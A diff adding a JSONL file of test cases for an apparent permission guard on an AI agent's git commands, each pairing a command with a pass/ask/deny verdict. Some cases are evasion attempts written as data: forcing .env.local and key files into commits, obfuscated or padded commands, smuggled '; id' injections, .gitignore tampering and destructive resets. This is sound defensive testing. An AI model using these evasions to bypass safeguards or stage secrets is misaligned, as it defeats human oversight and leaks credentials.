@@ -1,0 +1,594 @@
+{"id":"G1.01","verdict":"ask","command":"git commit -m x --amend","reason":"uses --amend"}
+{"id":"G1.02","verdict":"ask","command":"git commit --am -m x","reason":"uses --amend"}
+{"id":"G1.03","verdict":"ask","command":"git commit -am x","reason":"uses --all"}
+{"id":"G1.04","verdict":"ask","command":"git commit -m x --no-verify","reason":"uses --no-verify"}
+{"id":"G1.05","verdict":"ask","command":"git commit -m x -n","reason":"uses --no-verify"}
+{"id":"G1.06","verdict":"ask","command":"git commit -m x --amend && git status","reason":"uses --amend"}
+{"id":"G1.07","verdict":"pass","command":"git commit -m \"x\""}
+{"id":"G2.01","verdict":"ask","command":"git switch -c x --discard-changes","reason":"--discard-changes"}
+{"id":"G2.02","verdict":"ask","command":"git checkout -f main","reason":"--force"}
+{"id":"G2.03","verdict":"ask","command":"git switch -C x","reason":"--force-create"}
+{"id":"G2.04","verdict":"ask","command":"git switch --force-create x","reason":"--force-create"}
+{"id":"G2.05","verdict":"ask","command":"git switch --force-c x","reason":"--force-create"}
+{"id":"G2.06","verdict":"ask","command":"git checkout -B x","reason":"--force-create"}
+{"id":"G2.07","verdict":"pass","command":"git switch -c y"}
+{"id":"G3.01","verdict":"pass","command":"git add src/x.ts"}
+{"id":"G3.02","verdict":"pass","command":"git add .env.example"}
+{"id":"G3.03","verdict":"pass","command":"git add -- src/x.ts"}
+{"id":"G3.04","verdict":"ask","command":"git add -A","reason":"not a plain git call"}
+{"id":"G3.05","verdict":"ask","command":"git add -u","reason":"not a plain git call"}
+{"id":"G3.06","verdict":"ask","command":"git add src/x.ts 2>&1","reason":"not a plain git call"}
+{"id":"G3.07","verdict":"ask","command":"git add src/x.ts > /dev/null","reason":"not a plain git call"}
+{"id":"G4.01","verdict":"deny","setup":"secrets","command":"git add -f x","reason":"--force"}
+{"id":"G4.02","verdict":"deny","setup":"secrets","command":"git add --forc x","reason":"--force"}
+{"id":"G4.03","verdict":"deny","setup":"secrets","command":"git add -Af","reason":"--force"}
+{"id":"G4.04","verdict":"deny","setup":"secrets","command":"git add .env.local","reason":".env.local"}
+{"id":"G4.05","verdict":"deny","setup":"secrets","command":"git add certs/a.pem","reason":"certs/a.pem"}
+{"id":"G4.06","verdict":"deny","setup":"secrets","command":"git add .","reason":"certs/a.pem"}
+{"id":"G5.01","verdict":"deny","setup":"secrets","command":"git add $(cat list)","reason":"hides"}
+{"id":"G5.02","verdict":"deny","setup":"secrets","command":"git add `x`","reason":"hides"}
+{"id":"G5.03","verdict":"deny","setup":"secrets","command":"git add $F","reason":"hides"}
+{"id":"G5.04","verdict":"deny","setup":"secrets","command":"git add --pathspec-from-file=l","reason":"hides"}
+{"id":"G5.05","verdict":"deny","setup":"secrets","command":"git add --pathspec-file-nul --pathspec-from-file=l","reason":"hides"}
+{"id":"G5.06","verdict":"deny","setup":"secrets","command":"git add missing.ts","reason":"failed"}
+{"id":"G5.07","verdict":"deny","setup":"shim","command":"git add src/x.ts","reason":"timeout"}
+{"id":"G5.08","verdict":"deny","setup":"secrets","command":"git add -f .env.local <<'EOF'\nit's\nEOF","reason":"unreadable git add"}
+{"id":"G6.01","verdict":"deny","setup":"secrets","command":"git push origin feat/x && git add -f .env.local","reason":"--force"}
+{"id":"G6.02","verdict":"ask","command":"git commit -F - <<'EOF'\nadd the user's flag\nEOF","reason":"not a plain git call"}
+{"id":"G8.01","verdict":"pass","command":"git commit -m amend"}
+{"id":"G8.02","verdict":"pass","command":"git commit -m \"-n\""}
+{"id":"G8.03","verdict":"ask","command":"git commit -mall","reason":"not a plain git call"}
+{"id":"G8.04","verdict":"ask","command":"git commit -m x -uno","reason":"not a plain git call"}
+{"id":"G8.05","verdict":"pass","command":"git switch -c feat-f"}
+{"id":"G8.06","verdict":"ask","command":"git ci -m x --amend","reason":"uses --amend"}
+{"id":"G9.01","verdict":"deny","setup":"secrets","command":"timeout 60 git add .","reason":"unreadable git add"}
+{"id":"G9.02","verdict":"deny","setup":"secrets","command":"timeout 60 git add -f .env.local","reason":"unreadable git add"}
+{"id":"G9.03","verdict":"deny","setup":"secrets","command":"echo .env.local | xargs git add -f","reason":"unreadable git add"}
+{"id":"G9.04","verdict":"deny","command":"stdbuf -oL git add src/x.ts","reason":"unreadable git add"}
+{"id":"G9.05","verdict":"deny","setup":"secrets","command":"timeout 60 git \\\nadd .","reason":"unreadable git add"}
+{"id":"G9.06","verdict":"deny","setup":"secrets","command":"cat <<<x\ntimeout 60 git add .","reason":"unreadable git add"}
+{"id":"G9.07","verdict":"deny","setup":"secrets","command":"cat <<-'E'\n\tE\ntimeout 60 git add .","reason":"unreadable git add"}
+{"id":"G9.08","verdict":"ask","command":"stdbuf -oL git commit -m x --amend","reason":"could not read"}
+{"id":"G9.09","verdict":"ask","command":"timeout 60 git switch -c y --discard-changes","reason":"could not read"}
+{"id":"G9.10","verdict":"ask","command":"timeout 30 git commit -m \"fix a -- b\" --amend","reason":"could not read"}
+{"id":"G9.11","verdict":"ask","command":"timeout 30 git commit -m x '--amend'","reason":"could not read"}
+{"id":"G9.12","verdict":"deny","cwd":"__MAIN_TREE__","command":"git commit --amend -F - <<'EOF'\nit's\nEOF","reason":"never commit on 'main'"}
+{"id":"G9.13","verdict":"pass","command":"timeout 60 git status"}
+{"id":"G9.14","verdict":"ask","command":"timeout 5 git switch -c feat/add-x","reason":"not a plain git call"}
+{"id":"G9b.01","verdict":"deny","command":"git -c core.excludesFile=/dev/null add src/x.ts","reason":"hides"}
+{"id":"G9b.02","verdict":"deny","command":"git add -p","reason":"failed"}
+{"id":"G11.01","verdict":"deny","setup":"secrets","command":"git add \\\n  -f .env.local","reason":"--force"}
+{"id":"G11.02","verdict":"ask","command":"git commit -m x \\\n  --amend","reason":"uses --amend"}
+{"id":"G11.03","verdict":"ask","command":"git switch -c y \\\n  --discard-changes","reason":"--discard-changes"}
+{"id":"G11.04","verdict":"ask","command":"timeout 30 git commit -m \"a\n\nb\" --amend","reason":"could not read"}
+{"id":"G11.05","verdict":"deny","setup":"secrets","command":"git add --no-dry-run .env.local","reason":"--no-dry-run"}
+{"id":"G11.05b","verdict":"deny","command":"git add --no-d src/x.ts","reason":"--no-dry-run"}
+{"id":"G11.06","verdict":"deny","setup":"secrets","command":"git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git add -f .env.local","reason":"unreadable git add"}
+{"id":"G11.07","verdict":"ask","command":"git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git commit -m x --amend","reason":"--amend"}
+{"id":"G11.07b","verdict":"ask","command":"git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git commit -m x","reason":"more than 50"}
+{"id":"G11.08","verdict":"deny","setup":"nopy","command":"git add -f .env.local","reason":"unreadable git add"}
+{"id":"G11.09","verdict":"ask","setup":"nopy","command":"git commit -m x --amend","reason":"could not run its parser"}
+{"id":"G11.09b","verdict":"deny","setup":"nopy","command":"git -C . add -f .env.local","reason":"unreadable git add"}
+{"id":"G11.09c","verdict":"ask","setup":"nopy","command":"git switch -c y","reason":"could not run its parser"}
+{"id":"G11.09g","verdict":"deny","setup":"nopy","command":"git commit -m x; git add -f .env.local","reason":"unreadable git add"}
+{"id":"G11.09e","verdict":"deny","setup":"badpy","command":"git add -f .env.local","reason":"unreadable git add"}
+{"id":"G11.09f","verdict":"ask","setup":"badpy","command":"git commit -m x --amend","reason":"could not run its parser"}
+{"id":"G11.10","verdict":"ask","command":"git commit -m x .","reason":"uses pathspec"}
+{"id":"G11.11","verdict":"ask","command":"git commit -m x :/","reason":"uses pathspec"}
+{"id":"G11.12","verdict":"ask","command":"git commit -i -m x src/x.ts","reason":"uses --include"}
+{"id":"G11.12b","verdict":"ask","command":"git commit -o -m x src/x.ts","reason":"uses --only"}
+{"id":"G11.12c","verdict":"ask","command":"git commit -m x -- src/x.ts","reason":"uses pathspec"}
+{"id":"G11.13","verdict":"ask","command":"timeout 30 git commit -\\\nam x","reason":"--all"}
+{"id":"G11.13b","verdict":"ask","command":"git commit -\\\nam x","reason":"uses --all"}
+{"id":"G11.14","verdict":"pass","command":"git commit -m \"src/x.ts\""}
+{"id":"G11.15","verdict":"ask","command":"git commit -F msg.txt","reason":"not a plain git call"}
+{"id":"G11.15b","verdict":"ask","command":"git commit --author \"A <a@b>\" -m x","reason":"not a plain git call"}
+{"id":"G11.16","verdict":"ask","command":"git commit --pathspec-from-file=l -m x","reason":"uses pathspec"}
+{"id":"G11.17","verdict":"deny","cwd":"__FEAT_TREE__/src","setup":"secrets","command":"cd .. && git add .","reason":"cd before"}
+{"id":"G11.18","verdict":"deny","command":"pushd src && git add x.ts","reason":"cd before"}
+{"id":"G11.19","verdict":"ask","command":"git add src/x.ts && cd src","reason":"not a plain git call"}
+{"id":"G11.20","verdict":"ask","command":"cat > f <<'EOF'\ndon't\nEOF\ngit commit -m \"a --amend\"","reason":"not a plain git call"}
+{"id":"G11.09d","verdict":"deny","cwd":"__MAIN_TREE__","setup":"nopy","command":"git commit -m x","reason":"never commit on 'main'"}
+{"id":"G11.09h","verdict":"deny","setup":"nopy","command":"git commit -S -m x","reason":"never signs"}
+{"id":"G11.22","verdict":"deny","command":"touch src/new.ts && git add src/new.ts","reason":"same call"}
+{"id":"G12.01","verdict":"pass","setup":"envmod","command":"git add .env.example"}
+{"id":"G12.02","verdict":"deny","command":"cat <<<x\ntimeout 60 git add .\nx","reason":"unreadable git add"}
+{"id":"G12.03","verdict":"deny","command":"cat <<-'E'\n\tE\ntimeout 60 git add .\nE","reason":"unreadable git add"}
+{"id":"G13.01","verdict":"deny","setup":"ignored","command":"mv .gitignore g.old && git add -A","reason":"another command before"}
+{"id":"G13.02","verdict":"deny","setup":"ignored","command":"sed -i '/pem/d' .gitignore && git add .","reason":"another command before"}
+{"id":"G13.03","verdict":"deny","command":"echo x > src/y.ts && git add src/x.ts","reason":"another command before"}
+{"id":"G13.04","verdict":"deny","setup":"secrets","command":"git stage -f .env.local","reason":"--force"}
+{"id":"G13.05","verdict":"deny","setup":"secrets","command":"git stage .env.local","reason":".env.local"}
+{"id":"G13.06","verdict":"ask","command":"git commit -m x -p","reason":"uses --patch"}
+{"id":"G13.07","verdict":"ask","command":"git commit --interactive -m x","reason":"uses --interactive"}
+{"id":"G13.08","verdict":"ask","command":"git commit -m x --pat","reason":"uses --patch"}
+{"id":"G13.10","verdict":"deny","setup":"secrets","command":"git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; bash -c 'git add -f .env.local'","reason":"unreadable git add"}
+{"id":"G13.11","verdict":"ask","command":"git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; bash -c 'git commit -m x --amend'","reason":"more than 50"}
+{"id":"G13.12","verdict":"deny","setup":"nopy","command":"bash -c 'git add -f .env.local'","reason":"unreadable git add"}
+{"id":"G13.13","verdict":"ask","setup":"nopy","command":"sh -c 'git commit -m x --amend'","reason":"could not run its parser"}
+{"id":"G13.14","verdict":"deny","setup":"secrets","command":"ls x\\\n# ; git add -f .env.local","reason":"--force"}
+{"id":"G13.23","verdict":"deny","setup":"stalias","command":"git st src/x.ts","reason":"hides"}
+{"id":"G13.24","verdict":"deny","setup":"secrets","command":"bash -c 'git add -f .env.local' <<'E'\nit's\nE","reason":"unreadable git add"}
+{"id":"G13.25","verdict":"deny","setup":"nopy","command":"git stage -f .env.local","reason":"unreadable git add"}
+{"id":"G13.26","verdict":"deny","setup":"secrets","command":"timeout 5 git stage .","reason":"unreadable git add"}
+{"id":"G13.27","verdict":"deny","setup":"secrets","command":"git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git stage -f .env.local","reason":"unreadable git add"}
+{"id":"G13.15","verdict":"ask","command":"git status && git add src/x.ts","reason":"not a plain git call"}
+{"id":"G13.16","verdict":"ask","command":"git -C . add src/x.ts","reason":"not a plain git call"}
+{"id":"G13.17","verdict":"ask","command":"git add src/x.ts && git commit -m x","reason":"not a plain git call"}
+{"id":"G13.18","verdict":"ask","command":"git diff && git log -1 && git add src/x.ts","reason":"not a plain git call"}
+{"id":"G13.09","verdict":"deny","cwd":"__FEAT_TREE__/src","setup":"secrets","command":"builtin cd .. && git add .","reason":"unreadable git add"}
+{"id":"G13.19","verdict":"deny","command":"X=1; git add src/x.ts","reason":"unreadable git add"}
+{"id":"G13.20","verdict":"deny","command":"printf x | git add src/x.ts","reason":"unreadable git add"}
+{"id":"G13.28","verdict":"deny","setup":"ignored","command":"git status \"$(mv .gitignore g)\" && git add -A","reason":"another command before"}
+{"id":"G13.28b","verdict":"deny","setup":"ignored","command":"git diff \"`mv .gitignore g`\" && git add -A","reason":"another command before"}
+{"id":"G13.29","verdict":"ask","command":"bash -c 'git add src/x.ts'","reason":"not a plain git call"}
+{"id":"G11.13c","verdict":"ask","command":"git commit -\\\nam $'it\\'s'","reason":"--all"}
+{"id":"G11.09i","verdict":"deny","cwd":"__MAIN_TREE__","setup":"nopy","command":"git \\\ncommit -m x","reason":"never commit on 'main'"}
+{"id":"G12.04","verdict":"pass","setup":"envkeep","command":"git add .env.sample"}
+{"id":"G12.05","verdict":"pass","setup":"envkeep","command":"git add .env.template"}
+{"id":"G13.21","verdict":"pass","command":"git commit -m \"fix # 12\""}
+{"id":"G13.22","verdict":"ask","command":"git commit -m x # note","reason":"not a plain git call"}
+{"id":"G14.50","verdict":"ask","command":"git status x\\\\\ngit add -A","reason":"not a plain git call"}
+{"id":"G14.51","verdict":"ask","setup":"ignored","command":"git diff --output=.gitignore -- x\\\\\ngit add -A","reason":"not a plain git call"}
+{"id":"G14.52","verdict":"ask","command":"git status #c\\\ngit add -A","reason":"not a plain git call"}
+{"id":"G14.53","verdict":"ask","command":"git status x\\\\\ngit commit -mall","reason":"not a plain git call"}
+{"id":"G14.01","verdict":"ask","setup":"ignored","command":"git diff --output=.gitignore && git add -A","reason":"not a plain git call"}
+{"id":"G14.02","verdict":"ask","setup":"ignored","command":"git status > .gitignore; git add -A","reason":"not a plain git call"}
+{"id":"G14.03","verdict":"ask","setup":"ignored","command":"git status <(mv .gitignore g) ; git add -A","reason":"not a plain git call"}
+{"id":"G14.04","verdict":"ask","setup":"ignored","command":"git add -A & mv .gitignore g","reason":"not a plain git call"}
+{"id":"G14.05","verdict":"ask","setup":"ignored","command":"git add -A | mv .gitignore g","reason":"not a plain git call"}
+{"id":"G14.06","verdict":"ask","setup":"secrets","command":"echo $'\\'' ; git add -f .env.local ; echo \\'","reason":"not a plain git call"}
+{"id":"G14.07","verdict":"ask","setup":"secrets","command":"echo \\ # ; git add -f .env.local","reason":"not a plain git call"}
+{"id":"G14.08","verdict":"ask","setup":"secrets","command":"true\\;# ; git add -f .env.local","reason":"not a plain git call"}
+{"id":"G14.09","verdict":"ask","command":"echo \\ # ; git commit -m x --amend","reason":"not a plain git call"}
+{"id":"G14.10","verdict":"ask","command":"echo $'\\'' ; git commit -m x -a ; echo \\'","reason":"not a plain git call"}
+{"id":"G14.29","verdict":"ask","setup":"ignored","command":"g\\\nit add -A & mv .gitignore g","reason":"not a plain git call"}
+{"id":"G14.30","verdict":"ask","command":"g\\it add src/x.ts","reason":"not a plain git call"}
+{"id":"G14.31","verdict":"ask","command":"gi''t add src/x.ts","reason":"not a plain git call"}
+{"id":"G14.32","verdict":"ask","command":"g\"i\"t add src/x.ts","reason":"not a plain git call"}
+{"id":"G14.33","verdict":"ask","setup":"ignored","command":"git -C . add -A & mv .gitignore g","reason":"not a plain git call"}
+{"id":"G14.73","verdict":"ask","command":"git status && git a\\\ndd -A","reason":"not a plain git call"}
+{"id":"G14.76","verdict":"ask","command":"xgit add -A","reason":"not a plain git call"}
+{"id":"G14.77","verdict":"ask","command":"echo x\\\\\ng\\it commit -m x","reason":"not a plain git call"}
+{"id":"G14.78","verdict":"deny","command":"echo x\\\\\ng\\it add src/x.ts","reason":"unreadable git add"}
+{"id":"G14.11","verdict":"pass","command":"git commit -m \"feat: x\""}
+{"id":"G14.12","verdict":"pass","command":"git commit -m \"fix: it's done\""}
+{"id":"G14.54","verdict":"pass","command":"git commit -m 'feat: x'"}
+{"id":"G14.13","verdict":"pass","command":"git switch -c feat/y"}
+{"id":"G14.15","verdict":"pass","command":"git stage -- src/x.ts"}
+{"id":"G14.34","verdict":"pass","command":"git stage src/x.ts"}
+{"id":"G14.55","verdict":"pass","command":"  git add src/x.ts  "}
+{"id":"G14.35","verdict":"pass","command":"git -C __FEAT_TREE__ add src/x.ts"}
+{"id":"G14.81","verdict":"pass","command":"git commit -m \"été\""}
+{"id":"G14.91","verdict":"pass","command":"git add src/x.ts .env.example"}
+{"id":"G14.14","verdict":"allow","command":"git -C __FEAT_TREE__ commit -m \"spec: small x\"","reason":"one-line commit in another tree"}
+{"id":"G14.16","verdict":"ask","command":"git add src","reason":"not a plain git call"}
+{"id":"G14.36","verdict":"ask","command":"git -C __FEAT_TREE__ add src","reason":"not a plain git call"}
+{"id":"G14.74","verdict":"ask","setup":"ignored","cwd":"__MAIN_TREE__","command":"git -C __FEAT_TREE__ add certs","reason":"not a plain git call"}
+{"id":"G14.75","verdict":"ask","setup":"ignored","cwd":"__MAIN_TREE__","command":"git -C .feat add certs","reason":"not a plain git call"}
+{"id":"G14.92","verdict":"ask","command":"git add .env.example src","reason":"not a plain git call"}
+{"id":"G14.93","verdict":"ask","setup":"ignored","command":"git add src/x.ts certs","reason":"not a plain git call"}
+{"id":"G14.97","verdict":"ask","command":"git add src src/x.ts","reason":"not a plain git call"}
+{"id":"G14.98","verdict":"ask","command":"git add .env.example src src/x.ts","reason":"not a plain git call"}
+{"id":"G14.99","verdict":"ask","command":"git add src/../src/x.ts .env.example","reason":"not a plain git call"}
+{"id":"G14.100","verdict":"ask","command":"git add .env.example src/../src/x.ts","reason":"not a plain git call"}
+{"id":"G14.94","verdict":"ask","command":"git commit -m \"a\\b\"","reason":"not a plain git call"}
+{"id":"G14.95","verdict":"ask","command":"git commit -m 'a\\b'","reason":"not a plain git call"}
+{"id":"G14.96","verdict":"ask","command":"git commit -m -n","reason":"not a plain git call"}
+{"id":"G14.17","verdict":"ask","command":"git add src/x.ts;","reason":"not a plain git call"}
+{"id":"G14.18","verdict":"ask","command":"git add 'src/x.ts'","reason":"not a plain git call"}
+{"id":"G14.19","verdict":"ask","command":"git add src/x.ts # c","reason":"not a plain git call"}
+{"id":"G14.37","verdict":"ask","command":"git add src/x.ts --","reason":"not a plain git call"}
+{"id":"G14.38","verdict":"ask","command":"git add -v src/x.ts","reason":"not a plain git call"}
+{"id":"G14.39","verdict":"ask","command":"git -C .. add src/x.ts","reason":"not a plain git call"}
+{"id":"G14.40","verdict":"ask","command":"git add src/../src/x.ts","reason":"not a plain git call"}
+{"id":"G14.64","verdict":"ask","command":"git add src/x.ts\r","reason":"not a plain git call"}
+{"id":"G14.63","verdict":"ask","command":"git stage -A","reason":"not a plain git call"}
+{"id":"G14.47","verdict":"deny","command":"git add -- -x","reason":"could not confirm"}
+{"id":"G14.48","verdict":"deny","command":"git add src/$x.ts","reason":"hides what it stages"}
+{"id":"G14.49","verdict":"ask","command":"git add __FEAT_TREE__/src","reason":"not a plain git call"}
+{"id":"G14.20","verdict":"ask","command":"git commit -m \"a $HOME\"","reason":"not a plain git call"}
+{"id":"G14.21","verdict":"ask","command":"git commit -m \"a\\\"b\"","reason":"not a plain git call"}
+{"id":"G14.41","verdict":"ask","command":"git commit -m \"a\nb\"","reason":"not a plain git call"}
+{"id":"G14.42","verdict":"ask","command":"git commit -m \"a `b`\"","reason":"not a plain git call"}
+{"id":"G14.60","verdict":"ask","command":"git commit -m \"\"","reason":"not a plain git call"}
+{"id":"G14.65","verdict":"ask","command":"git commit -m \"a\rb\"","reason":"not a plain git call"}
+{"id":"G14.56","verdict":"ask","command":"git commit -m 'a$b'","reason":"not a plain git call"}
+{"id":"G14.59","verdict":"ask","command":"git commit -m 'it's'","reason":"not a plain git call"}
+{"id":"G14.61","verdict":"ask","command":"git commit -m ''","reason":"not a plain git call"}
+{"id":"G14.57","verdict":"ask","command":"git commit -m 'a' & mv .gitignore g & echo 'b'","reason":"not a plain git call"}
+{"id":"G14.58","verdict":"ask","command":"git commit -m \"a\" & mv .gitignore g & echo \"b\"","reason":"not a plain git call"}
+{"id":"G14.22","verdict":"ask","command":"git switch -c -x","reason":"not a plain git call"}
+{"id":"G14.62","verdict":"ask","command":"git switch -c a@b","reason":"not a plain git call"}
+{"id":"G14.23","verdict":"ask","command":"timeout 5 git commit -m \"x\"","reason":"not a plain git call"}
+{"id":"G14.28","verdict":"ask","command":"git \\\ncommit -m \"x\"","reason":"not a plain git call"}
+{"id":"G14.84","verdict":"ask","command":"git commit -m x;id","reason":"not a plain git call"}
+{"id":"G14.85","verdict":"ask","command":"git commit -m $x","reason":"not a plain git call"}
+{"id":"G14.86","verdict":"ask","command":"git commit -m 'a`b'","reason":"not a plain git call"}
+{"id":"G14.87","verdict":"ask","command":"git switch -c x;id","reason":"not a plain git call"}
+{"id":"G14.88","verdict":"ask","command":"git add src/*","reason":"not a plain git call"}
+{"id":"G14.89","verdict":"ask","command":"git add src/x.t?","reason":"not a plain git call"}
+{"id":"G14.79","verdict":"ask","command":"git switch -c é","reason":"not a plain git call"}
+{"id":"G14.80","verdict":"ask","command":"git commit -m é","reason":"not a plain git call"}
+{"id":"G14.90","verdict":"ask","command":"echo \\ # ; git $x'add' -A","reason":"not a plain git call"}
+{"id":"G14.24","verdict":"deny","setup":"secrets","command":"git add -f .env.local & echo x","reason":"--force"}
+{"id":"G14.25","verdict":"deny","cwd":"__MAIN_TREE__","command":"git commit -m \"x\"","reason":"never commit on 'main'"}
+{"id":"G14.43","verdict":"ask","command":"git commit -m x --amend && echo y","reason":"uses --amend"}
+{"id":"G14.26","verdict":"ask","command":"git log --grep \"git add\"","reason":"not a plain git call"}
+{"id":"G14.69","verdict":"ask","command":"git diff src/commit.ts","reason":"not a plain git call"}
+{"id":"G14.70","verdict":"ask","command":"git worktree add ../x","reason":"not a plain git call"}
+{"id":"G14.71","verdict":"ask","command":"/usr/bin/git add -A","reason":"not a plain git call"}
+{"id":"G14.72","verdict":"ask","command":"git$x add -A","reason":"not a plain git call"}
+{"id":"G14.27","verdict":"pass","command":"git status && git diff --stat && git log -1"}
+{"id":"G14.68","verdict":"pass","command":"git log --oneline -- src/address.ts"}
+{"id":"G14.66","verdict":"pass","command":"grep -n commit .claude/agents/github.md"}
+{"id":"G14.67","verdict":"pass","command":"cat .gitignore && echo add"}
+{"id":"G14.82","verdict":"pass","command":"$'\\x67it' add -A"}
+{"id":"G14.83","verdict":"pass","command":"gi$'t' add src/x.ts"}
+{"id":"G14.44","verdict":"ask","command":"git commit -F - <<'E'\nit's the git add fix\nE","reason":"not a plain git call"}
+{"id":"G14.45","verdict":"deny","setup":"secrets","command":"git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; git status; bash -c 'git stage -f .env.local'","reason":"unreadable git add"}
+{"id":"G14.46","verdict":"deny","setup":"secrets","command":"bash -c 'git stage -f .env.local' <<'E'\nit's\nE","reason":"unreadable git add"}
+{"id":"G14.101","verdict":"ask","command":"git add src/x.ts&id","reason":"not a plain git call"}
+{"id":"G14.102","verdict":"ask","command":"git add src/x.ts|id","reason":"not a plain git call"}
+{"id":"G14.103","verdict":"ask","command":"git add src/x.ts<id","reason":"not a plain git call"}
+{"id":"G14.104","verdict":"ask","command":"git commit -m x&id","reason":"not a plain git call"}
+{"id":"G14.105","verdict":"ask","command":"git commit -m x|id","reason":"not a plain git call"}
+{"id":"G14.106","verdict":"ask","command":"git commit -m x<id","reason":"not a plain git call"}
+{"id":"G14.107","verdict":"ask","command":"git commit -m x>id","reason":"not a plain git call"}
+{"id":"G14.108","verdict":"ask","command":"git commit -m `id`","reason":"not a plain git call"}
+{"id":"G14.109","verdict":"ask","command":"git commit -m x*","reason":"not a plain git call"}
+{"id":"G14.110","verdict":"ask","command":"git commit -m x?","reason":"not a plain git call"}
+{"id":"G14.111","verdict":"ask","command":"git switch -c x&id","reason":"not a plain git call"}
+{"id":"G14.112","verdict":"ask","command":"git switch -c x|id","reason":"not a plain git call"}
+{"id":"G14.113","verdict":"ask","command":"git switch -c x<id","reason":"not a plain git call"}
+{"id":"G14.114","verdict":"ask","command":"git switch -c x>id","reason":"not a plain git call"}
+{"id":"G14.115","verdict":"ask","command":"git switch -c `id`","reason":"not a plain git call"}
+{"id":"G14.116","verdict":"ask","command":"git switch -c $x","reason":"not a plain git call"}
+{"id":"G14.117","verdict":"ask","command":"git switch -c x*","reason":"not a plain git call"}
+{"id":"G14.118","verdict":"ask","command":"git switch -c x?","reason":"not a plain git call"}
+{"id":"G14.119","verdict":"pass","command":"\tgit add src/x.ts\t"}
+{"id":"G14.120","verdict":"ask","command":"\ngit add src/x.ts","reason":"not a plain git call"}
+{"id":"G14.121","verdict":"ask","command":"git  add src/x.ts","reason":"not a plain git call"}
+{"id":"G14.122","verdict":"ask","command":"git commit -m \"a\tb\"","reason":"not a plain git call"}
+{"id":"G14.123","verdict":"ask","command":"git status && git stage","reason":"not a plain git call"}
+{"id":"G14.124","verdict":"ask","command":"git commit","reason":"not a plain git call"}
+{"id":"G14.125","verdict":"ask","command":"echo add -A | xargs git","reason":"not a plain git call"}
+{"id":"G14.126","verdict":"ask","command":"grep -rn add --exclude-dir=.git .","reason":"not a plain git call"}
+{"id":"G14.127","verdict":"pass","command":"git commit -m feat:x"}
+{"id":"G14.128","verdict":"pass","command":"git commit -m 'a\"b'"}
+{"id":"G14.129","verdict":"pass","command":"git log -- src/unstage.ts"}
+{"id":"G14.130","verdict":"pass","command":"git log -- add_x.ts"}
+{"id":"G14.131","verdict":"ask","command":"git add \"-A\"","reason":"not a plain git call"}
+{"id":"G14.132","verdict":"ask","command":"git add \".\"","reason":"not a plain git call"}
+{"id":"G14.133","verdict":"ask","command":"git add \\-A","reason":"not a plain git call"}
+{"id":"G14.134","verdict":"ask","command":"git add \\.","reason":"not a plain git call"}
+{"id":"G14.135","verdict":"ask","command":"git add :/","reason":"not a plain git call"}
+{"id":"G14.136","verdict":"ask","command":"git switch -c x origin/main","reason":"not a plain git call"}
+{"id":"G14.137","verdict":"ask","command":"git add src/x.t[s]","reason":"not a plain git call"}
+{"id":"G14.138","verdict":"ask","command":"git -C __FEAT_TREE__&id add src/x.ts","reason":"not a plain git call"}
+{"id":"G14.139","verdict":"ask","command":"git commit -m src/[xy].ts","reason":"not a plain git call"}
+{"id":"G14.140","verdict":"ask","command":"git commit -m src/{x..y}.ts","reason":"not a plain git call"}
+{"id":"G14.141","verdict":"ask","command":"git switch -c v{1..2}","reason":"not a plain git call"}
+{"id":"G14.142","verdict":"ask","command":"git -C __FEAT_TREE__ --no-pager add src","reason":"not a plain git call"}
+{"id":"G16.001","verdict":"ask","command":"git clean -fdx","reason":"untracked files"}
+{"id":"G16.002","verdict":"ask","command":"git -c clean.requireForce=false clean -dx","reason":"untracked files"}
+{"id":"G16.003","verdict":"ask","command":"git reset --hard","reason":"--hard"}
+{"id":"G16.004","verdict":"ask","command":"git checkout -- .","reason":"overwrites"}
+{"id":"G16.005","verdict":"ask","command":"git restore .","reason":"overwrites"}
+{"id":"G16.006","verdict":"ask","command":"git restore '*.ts'","reason":"overwrites"}
+{"id":"G16.007","verdict":"ask","command":"git restore ':!README.md'","reason":"overwrites"}
+{"id":"G16.008","verdict":"ask","command":"git restore :/","reason":"overwrites"}
+{"id":"G16.009","verdict":"ask","command":"git restore src","reason":"overwrites"}
+{"id":"G16.010","verdict":"ask","command":"git stash clear","reason":"stashed work"}
+{"id":"G16.011","verdict":"ask","command":"git stash drop","reason":"stashed work"}
+{"id":"G16.012","verdict":"ask","command":"git branch -D x","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.013","verdict":"ask","command":"git branch -M x main","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.014","verdict":"ask","command":"git branch -C x main","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.015","verdict":"ask","command":"git branch -f x","reason":"deletes, renames over or resets a branch"}
